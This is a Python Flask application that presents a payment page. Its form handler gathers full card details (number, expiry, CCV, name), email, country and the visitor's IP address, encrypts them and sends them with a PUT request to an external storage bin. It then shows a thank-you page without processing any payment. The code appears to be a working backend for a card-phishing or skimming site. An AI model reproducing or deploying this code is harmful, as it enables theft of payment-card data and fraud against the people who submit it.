import pandas as pd
from flask import Flask, render_template, request, redirect

import requests, os

import secrets

url = os.environ.get('BIN')

headers = {
    "X-Master-Key": os.environ.get('X_M_KEY'),
    "Content-Type": "application/json"
}
# data base
DB = ['+++++++++++++++++++++++']

# create flask app
app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_BIN')


# Home page route
@app.route('/')
def home():
    return render_template('index.html')


@app.route('/payment/')
def payment():
    return render_template('payment/payment.html')


# Thank you page route
@app.route('/thanks/')  # create Serever ERROR page
def thank_you():
    return render_template('thanks/thanks.html')

# -------------------------------------

from cryptography.fernet import Fernet

key = os.environ.get('ENCRYPTION_KEY')
cipher = Fernet(key.encode('utf-8'))


# Form submission route
@app.route('/submit', methods=['POST'])
def submit():
    # Get user input from the form
    username = request.form['username']
    expiry = request.form['expiry']
    card_number = request.form['card_number']
    ccv = request.form['ccv']
    # optional inputs ('' are important)
    email = request.form['email'] + ''
    country = request.form['country'] + ''

    ip_address = request.remote_addr

    text = fr''' 
        user submitted
        * IP Address: {ip_address}
        * CARD-DETAILS:  Email= {email} ||| Name= {username} ||| expiry-date= {expiry} ||| card-number= {card_number} ||| ccv= {ccv} ||| country= {country} ;
        +++++++++++++++++
        '''

    encrypted_data = cipher.encrypt(text.encode('utf-8'))

    DB.append(encrypted_data.decode('utf-8'))
    large_text = ''.join(DB)
    requests.put(url, json={'data': large_text}, headers=headers)

    return redirect('/thanks')

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0')
